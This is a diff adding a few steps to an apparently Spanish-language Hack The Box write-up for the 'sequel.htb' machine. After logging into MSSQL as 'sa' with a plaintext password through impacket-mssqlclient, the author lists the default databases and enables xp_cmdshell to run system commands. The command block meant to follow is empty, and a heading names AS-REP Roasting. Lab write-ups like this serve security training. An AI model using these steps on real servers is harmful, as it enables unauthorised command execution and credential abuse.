@@ -125,7 +125,30 @@ impacket-mssqlclient 'sequel.htb/sa:MSSQLP@ssw0rd!@10.129.232.128'
 Obteniendo así un acceso a las bases de datos
 
 ### Enumeración e las bases de datos
+Enumeramos las bases de datos que hay
+```shell
+select name from sys.databases;
+```
 
+Mostrándonos 
+```shell
+name     
+------   
+master   
+tempdb   
+model    
+msdb     
+```
+
+Son las bases de datos por defecto, vamos a intentar ejecutar comandos de cmd
+Primero nos habilitamos la ejecucucion de comandos
+```shell
+enable_xp_cmdshell
+```
+
+Segundo ejecutamos un comando
+```
+```
 # Explotación
 ## AS-REP Roasting Attack
 
